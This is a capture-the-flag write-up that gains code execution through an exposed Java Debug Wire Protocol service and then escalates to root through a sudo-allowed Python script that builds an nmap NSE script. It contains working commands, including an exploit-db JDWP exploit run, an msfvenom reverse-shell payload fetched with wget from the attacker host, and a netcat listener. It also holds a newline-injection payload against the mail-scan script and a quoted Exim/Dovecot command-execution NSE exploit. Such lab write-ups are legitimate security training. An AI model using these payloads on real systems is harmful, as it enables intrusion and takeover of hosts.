![Challenge Description](leet_computer1.png)

Nmap scan:

```
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 c4:33:27:66:3f:17:50:56:3b:09:38:67:4c:72:50:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzQGqPjn6XclFkxXN4cmgaxHBwnwBxzKx7q79MtAifC4p94dYjnbTr6C/rDQMM/F2l1nxydpURH+v8qbtvTh3uYZ49GHPznV/JHre+5mAOzFi9NTNhtALSqEx4EP5TQANglLICbt36RXummCESc2mqdmucYGFj8C9liaOWsHSLDTGLYQgxzWcPuj3YtPJfC09jRTHi5pb1oaKAdFEN9dUhJKxjpYkZaQL9Rl09YBjs/rQ5NJQXsAnjjH7CHk//rSoK7wpR9iE8mWTdGuRFk3bPwol0xDaoLDtw4sClpOh9jGfmHqcY4PM1NxuCgFWdkaT0CuPwG8FcJ7lSjgp16PQLoWvoQThOpl51Y3slrANnJr3EYvr8wwj7+7Xt2Gr05EPVtOaS9+qUFieAfcZROY08hmjZKSAvjeNdeWtbPf2FbmDJRJkowtweZp5GgqDA/8jsyT27760DRz96hT2U6KY+/7wiLeCIJLUNssTUopdyXyXAeWcgAH4sMSnCbDvDbg0=
|   256 69:0d:ba:71:46:ee:cf:d4:66:2b:29:37:6e:16:a4:83 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCujl1it9BIzcj8af8foR2KZXMKxllJHR2gAZceIdV63hzdMAkslEHZA8+fy0CzKLUDNNaSgTLStHlGEH8cHac0=
|   256 c8:79:f7:37:06:1e:2a:63:98:51:54:ac:01:cf:57:65 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMI2WJBkxcKf3gOrGsY/39xUKb9nwHzfgKvR0SCRu37M
18001/tcp open  jdwp    syn-ack Java Debug Wire Protocol (Reference Implementation) version 11.0 11.0.11
|_jdwp-info: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see Java Debug Wire Protocol running which is interesting. Quick research indicates that RCE is easily achievable if this service is exposed.

There is existing Java Debug Wire Protocol RCE exploit proof of concept code available at https://www.exploit-db.com/exploits/46501.

Running the unmodified PoC exploit against the host:

```bash
kali@kali:~/CTF/norzh$ python2 46501.py -t 10.47.1.7 -p 18001
[+] Targeting '10.47.1.7:18001'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
[+] Found Runtime class: id=120f
[+] Found Runtime.getRuntime(): id=7f9c20023aa8
[-] Could not access class 'Ljava/net/ServerSocket;'
[-] It is possible that this class is not used by application
[-] Test with another one with option `--break-on`
[-] Exploit failed
```

The exploit failed but it does seem that we are able to communicate with the service successfully. The output indicates that the default "break-on" function, `java.net.ServerSocket.accept`, is not being used or called by whatever application is running on the JVM. This is most likely causing the exploit to fail because it depends on a breakpoint that we set to be triggered in order for the exploit to succeed.

In order to find a function that would be more likely to work, we can try to connect directly with the JDWP service.
There is a paper available at https://www.exploit-db.com/papers/27179 written by prdelka which explains how to leak useful information and determining a likely candidates for the "break-on" function which can be used for the breakpoint during exploitation.

```bash
kali@kali:~$ jdb -attach 10.47.1.7:18001
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
> trace go methods
Method entered: > "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method exited: return value = true, "thread=AWT-XAWT", jdk.internal.misc.Unsafe.compareAndSetInt(), line=-1 bci=-1
Method entered: "thread=Common-Cleaner", jdk.internal.ref.PhantomCleanable.isListEmpty(), line=120 bci=0
Method exited: return value = false, "thread=Common-Cleaner", jdk.internal.ref.PhantomCleanable.isListEmpty(), line=121 bci=28
Method entered: "thread=Common-Cleaner", jdk.internal.misc.InnocuousThread.eraseThreadLocals(), line=123 bci=0
Method entered: "thread=Common-Cleaner", jdk.internal.misc.Unsafe.putObject(), line=-1 bci=-1
Method exited: return value = <void value>, "thread=Common-Cleaner", jdk.internal.misc.Unsafe.putObject(), line=-1 bci=-1
Method entered: "thread=Common-Cleaner", jdk.internal.misc.Unsafe.putObject(), line=-1 bci=-1
Method exited: return value = <void value>, "thread=Common-Cleaner", jdk.internal.misc.Unsafe.putObject(), line=-1 bci=-1
Method exited: return value = <void value>, "thread=Common-Cleaner", jdk.internal.misc.InnocuousThread.eraseThreadLocals(), line=125 bci=22
```

After attaching to the JDWP service and running `trace go methods`, we can see a few likely candidates that would be good to use as our "break-on" function. We will use `jdk.internal.ref.PhantomCleanable.isListEmpty()`.

```bash
kali@kali:~/CTF/norzh$ python2 46501.py -t 10.47.1.7 -p 18001 --break-on jdk.internal.ref.PhantomCleanable.isListEmpty
[+] Targeting '10.47.1.7:18001'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
[+] Found Runtime class: id=1241
[+] Found Runtime.getRuntime(): id=55ea95e2c6a0
[+] Created break event id=2
[+] Waiting for an event on 'jdk.internal.ref.PhantomCleanable.isListEmpty'
[+] Received matching event from thread 0x12e9
[+] Found Java Virtual Machine specification vendor 'Oracle Corporation'
[+] Found Java Runtime Environment specification name 'Java Platform API Specification'
[-] java.ext.dirs: Unexpected returned type: expecting String
[+] Found Java Runtime Environment specification vendor 'Oracle Corporation'
[+] Found Java Virtual Machine specification version '11'
[+] Found Operating system name 'Linux'
[+] Found Default temp file path '/tmp'
[+] Found User's current working directory '/tmp/hsperfdata_e11i0t'
[+] Found Java installation directory '/usr/lib/jvm/java-11-openjdk-amd64'
[+] Found User's account name 'e11i0t'
[+] Found Java Virtual Machine implementation vendor 'Debian'
[+] Found Java Runtime Environment vendor 'Debian'
[+] Found Path separator ':'
[+] Found Java vendor URL 'https://tracker.debian.org/openjdk-11'
[+] Found Java class path '/opt/ghidra/support/../Ghidra/Framework/Utility/lib/Utility.jar:/opt/ghidra/Ghidra/patch:/opt/ghidra/Ghidra/Framework/DB/lib/DB.jar:/opt/ghidra/Ghidra/Framework/Docking/lib/javahelp-2.0.05.jar:/opt/ghidra/Ghidra/Framework/Docking/lib/timingframework-1.0.jar:/opt/ghidra/Ghidra/Framework/Docking/lib/Docking.jar:/opt/ghidra/Ghidra/Framework/FileSystem/lib/FileSystem.jar:/opt/ghidra/Ghidra/Framework/FileSystem/lib/ganymed-ssh2-262.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/jdom-legacy-1.1.3.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/log4j-api-2.12.1.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/commons-lang3-3.9.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/log4j-core-2.12.1.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/gson-2.8.6.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/commons-io-2.6.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/guava-19.0.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/cglib-nodep-2.2.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/commons-text-1.6.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/Generic.jar:/opt/ghidra/Ghidra/Framework/Generic/lib/commons-collections4-4.1.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/jung-graph-impl-2.1.1.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/jung-visualization-2.1.1.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/jgrapht-io-1.5.0.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/jung-api-2.1.1.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/jgrapht-core-1.5.0.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/jung-algorithms-2.1.1.jar:/opt/ghidra/Ghidra/Framework/Graph/lib/Graph.jar:/opt/ghidra/Ghidra/Framework/Help/lib/Help.jar:/opt/ghidra/Ghidra/Framework/Project/lib/Project.jar:/opt/ghidra/Ghidra/Framework/Project/lib/commons-compress-1.19.jar:/opt/ghidra/Ghidra/Framework/SoftwareModeling/lib/antlr-runtime-3.5.2.jar:/opt/ghidra/Ghidra/Framework/SoftwareModeling/lib/relaxngDatatype-20050913.jar:/opt/ghidra/Ghidra/Framework/SoftwareModeling/lib/SoftwareModeling.jar:/opt/ghidra/Ghidra/Framework/SoftwareModeling/lib/xsdlib-20050913.jar:/opt/ghidra/Ghidra/Framework/SoftwareModeling/lib/msv-20050913.jar:/opt/ghidra/Ghidra/Framework/SoftwareModeling/lib/isorelax-20050913.jar:/opt/ghidra/Ghidra/Framework/Utility/lib/Utility.jar:/opt/ghidra/Ghidra/Configurations/Public_Release/lib/Public_Release.jar:/opt/ghidra/Ghidra/Features/Base/lib/Base.jar:/opt/ghidra/Ghidra/Features/Base/lib/slf4j-api-1.7.25.jar:/opt/ghidra/Ghidra/Features/Base/lib/phidias-0.3.7.jar:/opt/ghidra/Ghidra/Features/Base/lib/biz.aQute.bndlib-5.1.2.jar:/opt/ghidra/Ghidra/Features/Base/lib/org.apache.felix.framework-6.0.3.jar:/opt/ghidra/Ghidra/Features/Base/lib/slf4j-nop-1.7.25.jar:/opt/ghidra/Ghidra/Features/BytePatterns/lib/BytePatterns.jar:/opt/ghidra/Ghidra/Features/ByteViewer/lib/ByteViewer.jar:/opt/ghidra/Ghidra/Features/DebugUtils/lib/DebugUtils.jar:/opt/ghidra/Ghidra/Features/Decompiler/lib/Decompiler.jar:/opt/ghidra/Ghidra/Features/DecompilerDependent/lib/DecompilerDependent.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/dex-translator-2.0.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/dex-reader-api-2.0.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/sevenzipjbinding-all-platforms-16.02-2.01.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/baksmali-1.4.0.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/asm-debug-all-4.1.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/dexlib-1.4.0.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/FileFormats.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/sevenzipjbinding-16.02-2.01.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/dex-ir-2.0.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/AXMLPrinter2.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/util-1.4.0.jar:/opt/ghidra/Ghidra/Features/FileFormats/lib/dex-reader-2.0.jar:/opt/ghidra/Ghidra/Features/FunctionGraph/lib/FunctionGraph.jar:/opt/ghidra/Ghidra/Features/FunctionGraphDecompilerExtension/lib/FunctionGraphDecompilerExtension.jar:/opt/ghidra/Ghidra/Features/FunctionID/lib/FunctionID.jar:/opt/ghidra/Ghidra/Features/GhidraServer/lib/GhidraServer.jar:/opt/ghidra/Ghidra/Features/GnuDemangler/lib/GnuDemangler.jar:/opt/ghidra/Ghidra/Features/GraphFunctionCalls/lib/GraphFunctionCalls.jar:/opt/ghidra/Ghidra/Features/GraphServices/lib/slf4j-api-1.7.25.jar:/opt/ghidra/Ghidra/Features/GraphServices/lib/GraphServices.jar:/opt/ghidra/Ghidra/Features/GraphServices/lib/jheaps-0.13.jar:/opt/ghidra/Ghidra/Features/GraphServices/lib/jungrapht-visualization-1.0.jar:/opt/ghidra/Ghidra/Features/GraphServices/lib/jungrapht-layout-1.0.jar:/opt/ghidra/Ghidra/Features/GraphServices/lib/slf4j-nop-1.7.25.jar:/opt/ghidra/Ghidra/Features/MicrosoftCodeAnalyzer/lib/MicrosoftCodeAnalyzer.jar:/opt/ghidra/Ghidra/Features/MicrosoftDemangler/lib/MicrosoftDemangler.jar:/opt/ghidra/Ghidra/Features/MicrosoftDmang/lib/MicrosoftDmang.jar:/opt/ghidra/Ghidra/Features/PDB/lib/PDB.jar:/opt/ghidra/Ghidra/Features/ProgramDiff/lib/ProgramDiff.jar:/opt/ghidra/Ghidra/Features/ProgramGraph/lib/ProgramGraph.jar:/opt/ghidra/Ghidra/Features/Python/lib/jython-standalone-2.7.2.jar:/opt/ghidra/Ghidra/Features/Python/lib/Python.jar:/opt/ghidra/Ghidra/Features/Recognizers/lib/Recognizers.jar:/opt/ghidra/Ghidra/Features/SourceCodeLookup/lib/SourceCodeLookup.jar:/opt/ghidra/Ghidra/Features/VersionTracking/lib/VersionTracking.jar:/opt/ghidra/Ghidra/Processors/68000/lib/68000.jar:/opt/ghidra/Ghidra/Processors/8051/lib/8051.jar:/opt/ghidra/Ghidra/Processors/AARCH64/lib/AARCH64.jar:/opt/ghidra/Ghidra/Processors/ARM/lib/ARM.jar:/opt/ghidra/Ghidra/Processors/Atmel/lib/Atmel.jar:/opt/ghidra/Ghidra/Processors/DATA/lib/DATA.jar:/opt/ghidra/Ghidra/Processors/Dalvik/lib/Dalvik.jar:/opt/ghidra/Ghidra/Processors/HCS12/lib/HCS12.jar:/opt/ghidra/Ghidra/Processors/JVM/lib/JVM.jar:/opt/ghidra/Ghidra/Processors/MIPS/lib/MIPS.jar:/opt/ghidra/Ghidra/Processors/PIC/lib/PIC.jar:/opt/ghidra/Ghidra/Processors/PowerPC/lib/PowerPC.jar:/opt/ghidra/Ghidra/Processors/RISCV/lib/RISCV.jar:/opt/ghidra/Ghidra/Processors/Sparc/lib/Sparc.jar:/opt/ghidra/Ghidra/Processors/SuperH4/lib/SuperH4.jar:/opt/ghidra/Ghidra/Processors/V850/lib/V850.jar:/opt/ghidra/Ghidra/Processors/tricore/lib/tricore.jar:/opt/ghidra/Ghidra/Processors/x86/lib/x86.jar'
[+] Found Java Runtime Environment specification version '11'
[+] Found Operating system version '5.10.0-kali7-cloud-amd64'
[+] Found Operating system architecture 'amd64'
[+] Found Java Runtime Environment version '11.0.11'
[+] Found Java Virtual Machine implementation version '11.0.11+9-post-Debian-1'
[+] Found Java Virtual Machine specification name 'Java Virtual Machine Specification'
[+] Found File separator '/'
[-] java.compiler: Unexpected returned type: expecting String
[+] Found Java class format version number '55.0'
[+] Found List of paths to search when loading libraries '/usr/java/packages/lib:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib'
[+] Found Java Virtual Machine implementation name 'OpenJDK 64-Bit Server VM'
[+] Found User's home directory '/home/e11i0t'
[!] Command successfully executed
```

It looks like the exploit succeeded! By default the exploit will run `uname` but we probably want to run something a bit more useful like a executing a reverse shell payload.

First, let's generate the payload and serve it:

```bash
kali@kali:~/CTF/norzh$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=172.16.120.68 LPORT=80 -f elf -o rev80.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: rev80.elf
kali@kali:~/CTF/norzh$ sudo python3 -m http.server 443
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
```

Start a netcat listener:
```bash
kali@kali:~$ sudo nc -nlvp 80
[sudo] password for kali:
listening on [any] 80 ...
```

```bash
kali@kali:~/CTF/norzh$ for cmd in "wget http://172.16.120.68:443/rev80.elf -O /tmp/rev80.elf" "chmod +x /tmp/rev80.elf" "/tmp/rev80.elf"; do python2 46501.py -t 10.47.1.7 -p 18001 --break-on jdk.internal.ref.PhantomCleanable.isListEmpty --cmd "$cmd"; done
[+] Targeting '10.47.1.7:18001'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
[+] Found Runtime class: id=1241
[+] Found Runtime.getRuntime(): id=55ea95e2c6a0
[+] Created break event id=2
[+] Waiting for an event on 'jdk.internal.ref.PhantomCleanable.isListEmpty'
[+] Received matching event from thread 0x12e9
[+] Selected payload 'wget http://172.16.120.68:443/rev80.elf -O /tmp/rev80.elf'
[+] Command string object created id:12ea
[+] Runtime.getRuntime() returned context id:0x12eb
[+] found Runtime.exec(): id=55ea95e2c6d8
[+] Runtime.exec() successful, retId=12ec
[!] Command successfully executed
[+] Targeting '10.47.1.7:18001'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
[+] Found Runtime class: id=1241
[+] Found Runtime.getRuntime(): id=55ea95e2c6a0
[+] Created break event id=2
[+] Waiting for an event on 'jdk.internal.ref.PhantomCleanable.isListEmpty'
[+] Received matching event from thread 0x12e9
[+] Selected payload 'chmod +x /tmp/rev80.elf'
[+] Command string object created id:12ea
[+] Runtime.getRuntime() returned context id:0x12eb
[+] found Runtime.exec(): id=55ea95e2c6d8
[+] Runtime.exec() successful, retId=12ec
[!] Command successfully executed
[+] Targeting '10.47.1.7:18001'
[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.11'
[+] Found Runtime class: id=1241
[+] Found Runtime.getRuntime(): id=55ea95e2c6a0
[+] Created break event id=2
[+] Waiting for an event on 'jdk.internal.ref.PhantomCleanable.isListEmpty'
[+] Received matching event from thread 0x12e9
[+] Selected payload '/tmp/rev80.elf'
[+] Command string object created id:12ea
[+] Runtime.getRuntime() returned context id:0x12eb
[+] found Runtime.exec(): id=55ea95e2c6d8
[+] Runtime.exec() successful, retId=12ec
[!] Command successfully executed
```

We should now have a reverse shell as `e11i0t`!

```bash
kali@kali:~$ sudo nc -nlvp 80
[sudo] password for kali:
listening on [any] 80 ...
connect to [172.16.120.68] from (UNKNOWN) [10.47.1.7] 54450
whoami
e11i0t
python3 -c 'import pty;pty.spawn("/bin/bash")'
e11i0t@team-188-erdosamphetamineaddiction-kali:/tmp/hsperfdata_e11i0t$ ^Z
[1]+  Stopped                 sudo nc -nlvp 80
kali@kali:~$ stty raw -echo # run 'fg' after this
e11i0t@team-188-erdosamphetamineaddiction-kali:/tmp/hsperfdata_e11i0t$
```

Running `sudo -l`, we notice that we can run a script called `mail-scan.py` as root without entering a password:

```bash
e11i0t@team-188-erdosamphetamineaddiction-kali:/tmp/hsperfdata_e11i0t$ sudo -l
Matching Defaults entries for e11i0t on team-188-erdosamphetamineaddiction-kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User e11i0t may run the following commands on team-188-erdosamphetamineaddiction-kali:
    (root) NOPASSWD: /home/e11i0t/scripts/mail-scan.py
```

Contents of `/home/e11i0t/scripts/mail-scan.py`

```python
#!/usr/bin/env python3
#coding: utf-8

import argparse
from tempfile import NamedTemporaryFile
from os import system
import re

TEMPLATE_NSE = """
description = [[
Attempts to exploit a remote command execution vulnerability in misconfigured Dovecot/Exim mail servers.

It is important to note that the mail server will not return the output of the command. The mail server
also wont allow space characters but they can be replaced with "${{IFS}}". Commands can also be
concatenated with "``". The script takes care of the conversion automatically.

References:
* https://www.redteam-pentesting.de/en/advisories/rt-sa-2013-001/-exim-with-dovecot-typical-misconfiguration-leads-to-remote-command-execution
* http://immunityproducts.blogspot.mx/2013/05/how-common-is-common-exim-and-dovecot.html
* CVE not available yet
]]

---
-- @usage nmap -sV --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="uname -a" <target>
-- @usage nmap -p586 --script smtp-dovecot-exim-exec --script-args smtp-dovecot-exim-exec.cmd="wget -O /tmp/p example.com/test.sh;bash /tmp/p" <target>
--
-- @output
-- PORT    STATE SERVICE REASON
-- 465/tcp open  smtps   syn-ack
-- |_smtp-dovecot-exim-exec: Malicious payload delivered:250 OK id=XXX
--
-- @args smtp-dovecot-exim-exec.cmd Command to execute. Separate commands with ";".
-- @args smtp-dovecot-exim-exec.auth Authentication scheme (Optional).
-- @args smtp-dovecot-exim-exec.user Authentication username (Optional).
-- @args smtp-dovecot-exim-exec.pwd Authentication password (Optional).
-- @args smtp-dovecot-exim-exec.from Email address to use in the FROM field. Default: nmap+domain. (Optional).
-- @args smtp-dovecot-exim-exec.to Email address to use in the TO field. Default: nmap@mailinator.com
-- @args smtp-dovecot-exim-exec.timeout Timeout value. Default: 8000. (Optional)
-- @args smtp-dovecot-exim-exec.domain Domain name to use. It attempts to set this field automatically. (Optional)
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {{"exploit"}}

local smtp = require "smtp"
local shortport = require "shortport"
local stdnse = require "stdnse"

portrule = shortport.port_or_service({{25, 465, 587}},
                {{"smtp", "smtps", "submission"}})


action = function(host, port)
  local cmd = stdnse.get_script_args(SCRIPT_NAME..".cmd") or "uname"
  --Prepare payload
  cmd = string.gsub(cmd, " ", "${{IFS}}")
  cmd = string.gsub(cmd, ";", "``")

  local user = stdnse.get_script_args(SCRIPT_NAME..".user") or nil
  local pwd = stdnse.get_script_args(SCRIPT_NAME..".pwd") or nil
  local from = stdnse.get_script_args(SCRIPT_NAME..".from") or "nmap@"..smtp.get_domain(host)
  local to = "{mail_address}"
  local conn_timeout = stdnse.get_script_args(SCRIPT_NAME..".timeout") or 8000
  local smtp_domain = stdnse.get_script_args(SCRIPT_NAME..".domain") or smtp.get_domain(host)

  local smtp_opts = {{
    ssl = true, timeout = conn_timeout, recv_before = true, lines = 1
  }}
  local smtp_conn = smtp.connect(host, port, smtp_opts)

  local status, resp = smtp.ehlo(smtp_conn, smtp_domain)
  local auth_mech = stdnse.get_script_args(SCRIPT_NAME..".auth") or smtp.get_auth_mech(resp)
  if type(auth_mech) == "string" then
    auth_mech = {{ auth_mech }}
  end

  if (user and pwd) then
    status = false
    stdnse.print_debug(1, "%s:Mail server requires authentication.", SCRIPT_NAME)
    for i, mech in ipairs(auth_mech) do
      stdnse.print_debug(1, "Trying to authenticate using the method:%s", mech)
      status, resp = smtp.login(smtp_conn, user, pwd, mech)
      if status then
        break
      end
    end
    if not(status) then
      stdnse.print_debug(1, "%s:Authentication failed using user '%s' and password '%s'", SCRIPT_NAME, user, pwd)
      return nil
    end
  end

  --Sends MAIL cmd and injects malicious payload
  local from_frags =  stdnse.strsplit("@", from)
  local malicious_from_field = from_frags[1].."`"..cmd.."`@"..from_frags[2]
  stdnse.print_debug(1, "%s:Setting malicious MAIL FROM field to:%s", SCRIPT_NAME, malicious_from_field)
  status, resp = smtp.mail(smtp_conn, malicious_from_field)
  if not(status) then
    stdnse.print_debug(1, "%s:Payload failed:%s", SCRIPT_NAME, resp)
    return nil
  end

  --Sets recipient
  status, resp = smtp.recipient(smtp_conn, to)
  if not(status) then
    stdnse.print_debug(1, "%s:Cannot set recipient:%s", SCRIPT_NAME, resp)
    return nil
  end

  --Sets data and deliver email
  status, resp = smtp.datasend(smtp_conn, "nse")
  if status then
    return string.format("Malicious payload delivered:%s", resp)
  else
    stdnse.print_debug(1, "%s:Payload could not be delivered:%s", SCRIPT_NAME, resp)
  end
  return nil
 end
"""

parser = argparse.ArgumentParser()
parser.add_argument('--ip', required=True, help='IP of the Dovecot to attacc')
parser.add_argument('--mail', required=True, help='Mail address to check')
args = parser.parse_args()

# Arguments validation
ipregex = re.compile('^([0-9]{3}\.){3}[0-9]{3}$')
if not ipregex.match(args.ip):
  print("Error: IP argument is invalid")
  exit(1)

f = NamedTemporaryFile(suffix=".nse")
with open(f.name, "w") as tmp_file:
    tmp_file.write(TEMPLATE_NSE.format(mail_address=args.mail))
system("nmap --script={} '{}'".format(tmp_file.name, args.ip))
```

Essentially, it looks like this script generates a temporary file containing a NSE script which will be run using nmap.
```python
system("nmap --script={} '{}'".format(tmp_file.name, args.ip))
```

The temporary file will be generated with user-supplied values injected into it via Python string formatting.
```python
with open(f.name, "w") as tmp_file:
    tmp_file.write(TEMPLATE_NSE.format(mail_address=args.mail))
```

The script accepts an IP address via `--ip` and a mail address which will be used as the recipient via `--mail`. The IP argument is checked against the regex `'^([0-9]{3}\.){3}[0-9]{3}$'` which restricts it to IP addresses with 3 digits in each octet, which makes command injection via the IP argument not possible.

Since the mail address is being injected into the generated temporary file via Python `str.format`, we can leverage this to inject additional code to be run in the NSE script.

To do so, we will essentially use CRLF injection in order to add a command to the script which will run `/bin/sh`, granting us a shell as `root`.
The mail address argument payload which generates a script which works for our purposes ends up being:

```bash
python check-mail.py --ip $IP --mail $'root@localhost"    \nos.execute("/bin/sh")"'`.
```

One caveat is that the script will only run if it detects that the host has the SMTP port (25) open. At first glance, the regex check seems to eliminate any possibility of using our attacker box as the target to be scanned because our IP does not match the regex (172.16.120.68). However, we can simply pad the IP with zeroes wherever necessary and nmap will process the IP the same way: `172.016.120.068`.
Note: Technically, you could also use any public IP which has that port open and matches the regex, which is how I initially solved it (using shodan.io).

Start a netcat listener on port 25 on your attacker machine so that nmap will execute our script:

```bash
kali@kali:~/CTF/norzh$ nc -nlvp 25
listening on [any] 25 ...
```

Run the `mail-scan.py` script using the below command:

```bash
sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 --mail $'root@localhost"    \nos.execute("/bin/sh")"'
```

```bash
e11i0t@/home/e11i0t/scripts$ sudo /home/e11i0t/scripts/mail-scan.py --ip 172.016.120.068 -->
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 09:18 UTC
# root
# check-pass.py  mail-scan.py  mkcd.py
# flag  run_ghidra.sh
# NORZH{e11i0t_1s_s0_1337!!}
```

Flag: `NORZH{e11i0t_1s_s0_1337!!}`

Additional Resources:
- https://ioactive.com/hacking-java-debug-wire-protocol-or-how/
- https://www.exploit-db.com/exploits/46501
- https://www.exploit-db.com/papers/27179
